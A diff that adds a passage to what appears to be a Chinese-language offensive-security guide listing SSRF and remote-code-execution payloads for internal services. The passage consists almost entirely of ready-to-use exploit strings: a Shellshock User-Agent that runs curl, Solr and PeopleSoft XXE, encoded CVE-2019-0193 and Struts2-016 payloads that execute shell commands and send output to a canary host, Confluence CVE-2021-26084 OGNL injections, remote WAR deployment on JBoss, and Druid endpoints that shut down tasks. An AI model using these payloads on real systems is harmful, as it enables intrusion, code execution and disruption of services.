@@ -153,3 +153,189 @@ http://127.0.0.1:8500/? HTTP/1.1\r\nConnection: keep-alive\r\nHost: example.org\
 常用绑定端口 80 443 8080
 
 为了有效地测试Shellshock，需要添加包含有效负载的标头，[访问](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/shellshock-cgi-paths.txt)即可查看CGI路径列表。
+
+通过用户代理进行Shellshock
+```http
+User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
+```
+
+### Apache Druid
+
+常用绑定端口 80 8080 8888 8082
+
+查看以下路径是否返回200状态码
+```http
+/status/selfDiscovered/status
+/druid/coordinator/v1/leader
+/druid/coordinator/v1/metadata/datasources
+/druid/indexer/v1/taskStatus
+```
+
+关闭任务，需要猜测任务ID或数据源名称
+```http
+/druid/indexer/v1/task/{taskId}/shutdown
+/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
+```
+
+关闭Apache Druid Overlords主管
+```http
+/druid/indexer/v1/supervisor/terminateAll
+/druid/indexer/v1/supervisor/{supervisorId}/shutdown
+```
+
+### Apache Solr
+
+常用绑定端口 8983
+
+```http
+/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
+/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
+/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
+/xxx?q=aaa&shards=http://SSRF_CANARY/solr
+```
+
+Apache Solr 7.0.1 XXE
+```http
+/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
+/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
+```
+
+CVE-2019-0193
+
+```http
+GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%55%52%4c%44%61%74%61%53%6f%75%72%63%65%22%2f%3e%0d%0a%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%66%75%6e%63%74%69%6f%6e%20%66%31%28%64%61%74%61%29%7b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%5b%22%28%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%29%22%5d%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%63%22%2c%22%63%75%72%6c%20%31%32%37%2e%30%2e%30%2e%31%3a%38%39%38%34%2f%78%78%78%22%5d%29%2e%73%74%61%72%74%28%29%7d%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%75%72%6c%3d%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%61%64%6d%69%6e%2f%69%6e%66%6f%2f%73%79%73%74%65%6d%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%72%65%73%70%6f%6e%73%65%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%48%54%4d%4c%53%74%72%69%70%54%72%61%6e%73%66%6f%72%6d%65%72%2c%52%65%67%65%78%54%72%61%6e%73%66%6f%72%6d%65%72%2c%73%63%72%69%70%74%3a%66%31%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
+```
+
+测试时，请确保entity部分中指定的URL可从Solr端访问，并返回有效的XML文档已通过Xpath评估
+
+另一种方法是使用数据源类型以及驱动程序
+```http
+GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%4a%64%62%63%44%61%74%61%53%6f%75%72%63%65%22%20%64%72%69%76%65%72%3d%22%63%6f%6d%2e%73%75%6e%2e%72%6f%77%73%65%74%2e%4a%64%62%63%52%6f%77%53%65%74%49%6d%70%6c%22%20%6a%6e%64%69%4e%61%6d%65%3d%22%72%6d%69%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%36%30%36%30%2f%78%78%78%22%20%61%75%74%6f%43%6f%6d%6d%69%74%3d%22%74%72%75%65%22%2f%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
+```
+
+### PeopleSoft
+
+常用绑定端口 80 443
+
+XXE
+```http
+POST /PSIGW/HttpListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+<?xml version="1.0"?>
+<!DOCTYPE IBRequest [
+<!ENTITY x SYSTEM "http://SSRF_CANARY">
+]>
+<IBRequest>
+   <ExternalOperationName>&x;</ExternalOperationName>
+   <OperationType/>
+   <From><RequestingNode/>
+      <Password/>
+      <OrigUser/>
+      <OrigNode/>
+      <OrigProcess/>
+      <OrigTimeStamp/>
+   </From>
+   <To>
+      <FinalDestination/>
+      <DestinationNode/>
+      <SubChannel/>
+   </To>
+   <ContentSections>
+      <ContentSection>
+         <NonRepudiation/>
+         <MessageVersion/>
+         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
+         </Data>
+      </ContentSection>
+   </ContentSections>
+</IBRequest>
+```
+
+XXE
+```http
+POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
+```
+
+### Apache Struts
+
+常用绑定端口 80 443 8080 8443
+
+Struts2-016
+```http
+?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
+```
+
+### JBoss
+
+常用绑定端口 80 443 8080 8443
+
+从URL部署WAR
+```http
+/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
+```
+
+### Confluence
+
+常用绑定端口 80 443 8080 8443
+
+CVE-2021-26084
+```http
+/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/doenterpagevariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/createpage.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/templates2/viewpagetemplate.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/template/custom/content-editor?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/templates/editor-preload-container?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/users/user-dark-features?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+```
+
+共享链接(2016年11月及更早版本)
+```http
+/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
+```
+
+CVE-2017-9506
+```http
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+```
+
+### Jira
+
+常用绑定端口 80 443 8080 8443
+
+CVE-2017-9506
+```http
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+```
+
+CVE-2019-8451
+```http
+/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
+```
+
+### 其它Atlassian产品
+
+常用绑定端口 80 443 8080 8443
+
+CVE-2017-9506
+
++ Bamboo < 6.0.0 </br>
++ Bitbucket < 4.14.4</br>
++ Crowd < 2.11.2</br>
++ Crucible < 4.3.2</br>
++ Fisheye < 4.3.2</br>
+
+```http
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+```
